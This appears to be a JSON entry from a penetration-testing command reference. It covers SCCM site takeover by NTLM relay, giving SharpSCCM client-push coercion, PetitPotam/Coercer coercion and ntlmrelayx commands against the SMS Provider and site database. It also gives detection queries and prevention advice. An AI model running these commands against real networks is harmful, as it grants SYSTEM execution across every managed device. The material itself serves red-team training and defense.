@@ -1,0 +1,106 @@
+{
+  "id": "sccm-site-takeover-relay",
+  "name": "SharpSCCM - SCCM Site Takeover via NTLM Relay",
+  "command": "SharpSCCM.exe invoke client-push -t <lhost>",
+  "description": "SCCM site takeover (Misconfiguration Manager TAKEOVER) coerces NTLM authentication from a site server or a privileged machine account - via automatic client push installation or a coercion primitive - and relays it to the SMS Provider (admin service / SMS_Admin) or to the site database (MSSQL). Relaying machine-account auth to the site DB or SMS Provider grants Full Administrator over the SCCM hierarchy, from which applications and scripts can be deployed as SYSTEM to any managed device.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "SCCM Attacks",
+  "certifications": [
+    "CRTP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Misconfiguration Manager (TAKEOVER-1/2); SharpSCCM; ntlmrelayx",
+  "tags": [
+    "sccm",
+    "mecm",
+    "sharpsccm",
+    "ntlm-relay",
+    "site-takeover",
+    "client-push",
+    "mssql"
+  ],
+  "mitre": [
+    "T1557.001",
+    "T1078.002"
+  ],
+  "exam": "restricted",
+  "notes": "=== TRIGGER COERCION (automatic client push - TAKEOVER-1) ===\n  # Abuse automatic client push to make the site/primary server authenticate to you:\n  SharpSCCM.exe invoke client-push -t <lhost>\n  # SharpSCCM can also enumerate push settings first:\n  SharpSCCM.exe get client-push-settings\n\n=== RELAY TO THE SMS PROVIDER (admin service) ===\n  # Relay the coerced machine auth to the SMS Provider HTTP admin service:\n  ntlmrelayx.py -t https://<smsprovider>/AdminService/wmi/SMS_... -smb2support\n  # Or relay to MSSQL site DB (TAKEOVER-2):\n  ntlmrelayx.py -t mssql://<sitedb_host> -smb2support -q \"...\"\n\n=== ALTERNATIVE COERCION PRIMITIVES ===\n  # Any coercion to the site server works (PetitPotam / Coercer):\n  Coercer coerce -u <user> -p <password> -t <site_server> -l <lhost>\n  PetitPotam.py <lhost> <site_server>\n\n=== RESULT ===\n  # Add your principal as a Full Administrator in SCCM, then deploy payloads:\n  #   -> see sccm-app-deployment-exec for execution as SYSTEM\n\n=== ALTERNATIVES ===\n  ad-krbrelayup / krbrelayx    # Kerberos relay variants\n  Relay to ADCS (ESC8)         # different relay target",
+  "examples": [
+    {
+      "label": "Coerce site server via client push",
+      "command": "SharpSCCM.exe invoke client-push -t <lhost>"
+    },
+    {
+      "label": "Relay to MSSQL site database",
+      "command": "ntlmrelayx.py -t mssql://<sitedb_host> -smb2support"
+    },
+    {
+      "label": "Coerce with Coercer instead",
+      "command": "Coercer coerce -u <user> -p <password> -t <target> -l <lhost>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Misconfiguration Manager - TAKEOVER",
+      "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+    },
+    {
+      "title": "SharpSCCM",
+      "url": "https://github.com/Mayyhem/SharpSCCM"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-coercer-multi",
+      "note": "Coercion primitive to force the site-server authentication.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-krbrelayx",
+      "note": "Alternative relay toolkit for the coerced auth.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sccm-app-deployment-exec",
+      "note": "Deploy payloads as SYSTEM after takeover.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "SCCM automatic client push and the SMS Provider/site DB often lack SMB signing and channel binding / Extended Protection, so a coerced machine-account NTLM authentication can be relayed to the admin service (HTTP) or MSSQL. The site server's machine account is highly privileged in SCCM, so relaying it yields Full Administrator over the hierarchy.",
+    "prerequisites": "A coercion primitive or enabled automatic client push, a relay target (SMS Provider admin service or site DB) without EPA/signing, and network position to receive and relay the authentication.",
+    "impact": "Full Administrator over the SCCM hierarchy, enabling SYSTEM-level code execution on every managed device (effective domain-wide compromise).",
+    "detection": "[MITRE T1557.001] Machine-account logons to the SMS Provider/site DB from an unexpected host; client-push authentication to a non-SCCM IP; NTLM relay patterns (same account authenticating from attacker host); new SCCM Full Administrator added.",
+    "artifacts": "4624/4648 logons for the site-server machine account from an unusual source; MSSQL logins on the site DB from a non-SCCM host; SMS admin-service (IIS) requests; SCCM audit (SMS_Admin) showing a new Full Administrator.",
+    "splunk_spl": "index=windows EventCode=4624 Logon_Type=3 Account_Name=\"*$\" (dest=\"*smsprovider*\" OR dest=\"*sitedb*\")\n| stats count by Account_Name, src_ip, dest\n| where src_ip!=\"<expected_siteserver_ip>\"",
+    "elastic_kql": "event.code:\"4624\" and winlog.event_data.LogonType:\"3\" and user.name:*$ and winlog.event_data.IpAddress:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and TargetUserName endswith \"$\"\n| where Computer has_any (\"smsprovider\", \"sitedb\")\n| summarize Count=count() by TargetUserName, IpAddress, Computer, bin(TimeGenerated, 30m)",
+    "sigma_rules": "win_sccm_machineaccount_relay_to_provider",
+    "prevention": "Disable automatic client push installation (or require Kerberos-only and a strong push account with no admin); enforce SMB signing and Extended Protection for Authentication on the SMS Provider and site DB; require HTTPS/PKI (Enhanced HTTP); tier the site server as Tier 0; alert on new Full Administrators and on machine-account logons from unexpected hosts.",
+    "sources": [
+      "https://github.com/subat0mik/Misconfiguration-Manager",
+      "https://github.com/Mayyhem/SharpSCCM"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Site-server machine-account relayed to SMS Provider / site DB",
+        "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and TargetUserName endswith \"$\"\n| where Computer has_any (\"smsprovider\", \"sitedb\")\n| summarize Count=count(), Srcs=make_set(IpAddress) by TargetUserName, Computer, bin(TimeGenerated, 30m)",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4624"
+        ],
+        "attack": [
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "SCCM site components authenticate between roles legitimately.",
+        "tuning": "Allowlist the real site-server and SMS Provider source IPs; alert on the machine account authenticating from any other host."
+      }
+    ]
+  }
+}
